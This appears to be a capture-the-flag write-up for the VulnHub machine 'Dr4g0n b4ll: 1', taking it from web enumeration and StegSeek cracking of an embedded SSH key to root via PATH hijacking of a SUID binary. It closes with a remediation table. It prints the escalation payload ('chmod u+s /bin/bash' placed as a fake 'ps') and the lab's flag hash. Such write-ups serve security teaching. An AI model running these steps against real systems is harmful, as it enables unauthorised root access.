# Dr4g0n b4ll: 1 — VulnHub Writeup

**Platform:** VulnHub | **Difficulty:** Easy | **Target IP:** 192.168.32.142 | **Attacker IP:** 192.168.32.128

## Machine info

[![Machine info](images/01-machine-info.png)](images/01-machine-info.png)

## Summary

**Dr4g0n b4ll: 1** is built around a Dragon Ball themed website that hides its real path behind a `robots.txt` riddle and a triple Base64-encoded HTML comment. Following that trail leads to a hidden directory containing an image with an SSH private key embedded via steganography. From there, privilege escalation was achieved by hijacking `$PATH` against a SUID binary that calls an external command without an absolute path.

**Attack chain:** Nmap recon → gobuster finds robots.txt riddle → Hidden HTML comment (triple Base64) → Hidden `/DRAGON BALL/` directory → Steganography in `aj.jpg` reveals SSH private key → SSH access as xmen → SUID binary `shell` vulnerable to PATH hijacking (`ps`) → Root

## 1. Reconnaissance

[![arp-scan](images/02-arp-scan.png)](images/02-arp-scan.png)

[![ping](images/03-ping.png)](images/03-ping.png)

```
nmap -p- -sS -sV -sC -vvv -oN scan.txt 192.168.32.142

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: DRAGON BALL | Aj's
|_http-server-header: Apache/2.4.38 (Debian)
```

Two services of interest: SSH and Apache with a Dragon Ball themed homepage.

## 2. Web Enumeration

[![Homepage](images/04-homepage.png)](images/04-homepage.png)

A directory brute force turned up `robots.txt`:

```
gobuster dir -u http://192.168.32.142/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,txt

robots.txt           (Status: 200) [Size: 33]
```

It returned a Base64-encoded riddle. Decoding it with `base64 -d` reveals: **"you find the hidden dir"**.

[![robots.txt](images/05-robots-txt.png)](images/05-robots-txt.png)

Viewing the homepage's HTML source revealed a hidden comment with a Base64-looking string:

```
<! VWtaS1FsSXdPVTlKUlVwQ1ZFVjNQUT09 >
```

Decoding it took three chained rounds of Base64 (CyberChef, three "From Base64" operations), revealing the name of the hidden directory: **DRAGON BALL**.

[![CyberChef triple Base64 decode](images/06-cyberchef-decode.png)](images/06-cyberchef-decode.png)

Browsing to the revealed directory exposed a listing:

[![Index of /DRAGON BALL/](images/07-dragonball-dir-index.png)](images/07-dragonball-dir-index.png)

`secret.txt` contained a short custom wordlist — mostly generic entries with no connection to the machine, mixed with a few real page names on the site (`aj.html`, `zoom.html`, `zero.html`, `welcome.html`):

[![secret.txt](images/08-secret-txt.png)](images/08-secret-txt.png)

Browsing into the `Vulnhub/` subdirectory exposed two files:

[![Index of /DRAGON BALL/Vulnhub/](images/09-vulnhub-dir-index.png)](images/09-vulnhub-dir-index.png)

`login.html` rendered a themed "WELCOME TO xmen" login page. The form itself wasn't used, but it's where the `xmen` username later guessed for SSH access came from:

[![login.html](images/10-login-page.png)](images/10-login-page.png)

`aj.jpg` was downloaded for further analysis:

```
curl -O http://192.168.32.142/DRAGON20BALL/Vulnhub/aj.jpg
```

## 3. Steganography

`aj.jpg` was tested with StegSeek against `rockyou.txt`, which cracked the embedded passphrase and extracted a hidden file:

```
stegseek aj.jpg /usr/share/wordlists/rockyou.txt

StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "love"
[i] Original filename: "id_rsa".
[i] Extracting to "aj.jpg.out".
```

The extracted file was an OpenSSH private key:

```
cat aj.jpg.out

-----BEGIN OPENSSH PRIVATE KEY-----
[...]
-----END OPENSSH PRIVATE KEY-----
```

## 4. Initial Access

```
chmod 600 id_rsa
```

Guessing the username `xmen` worked on the first try:

[![SSH login](images/11-ssh-login.png)](images/11-ssh-login.png)

## 5. Local Flag & Enumeration

```
cat local.txt

your flag: 192fb6275698b5ad9868c7afb62fd555
```

A search for SUID binaries on the system turned up nothing unusual besides the standard Debian set, aside from a binary inside the user's own home directory:

```
find / -perm -4000 2>/dev/null

/home/xmen/script/shell
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
```

The `script/` folder also contained the binary's source:

```
cd script/
ls -la

-rw-r--r-- 1 root root    75 Jan  4  2021 demo.c
-rwsr-xr-x 1 root root 16712 Jan  4  2021 shell
```

## 6. Privilege Escalation

The `shell` SUID binary (compiled from `demo.c`) calls the `ps` command internally without an absolute path. This was exploited by placing a malicious `ps` earlier in `$PATH`:

```
cd /tmp
echo "chmod u+s /bin/bash" > ps
chmod +x ps
export PATH=/tmp:$PATH
echo $PATH

/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Since `shell` runs with the SUID bit set as root, it invoked the malicious `ps` as root, setting the SUID bit on `/bin/bash`. Running `bash -p` then dropped into a root shell:

[![PATH hijacking exploit](images/12-shell-suid-exploit.png)](images/12-shell-suid-exploit.png)

[![Root confirmed](images/13-root-confirmed.png)](images/13-root-confirmed.png)

[![Root flag](images/14-proof-flag.png)](images/14-proof-flag.png)

## Root Cause & Remediation

| Issue | Fix |
|---|---|
| Sensitive hints (Base64-encoded directory name, robots.txt riddle) and a hidden directory exposed under the web root | Never rely on obscurity to hide sensitive paths; disable directory listing and keep secrets out of the webroot entirely |
| SSH private key hidden inside an image via steganography with a weak, dictionary-crackable passphrase | Never distribute private keys through steganography; enforce strong, non-dictionary passphrases on any protected secret |
| SUID binary `shell` calls `ps` without an absolute path | Always invoke external commands with fully-qualified paths and a sanitized `PATH` inside SUID/SGID programs; remove the setuid bit where it isn't required |
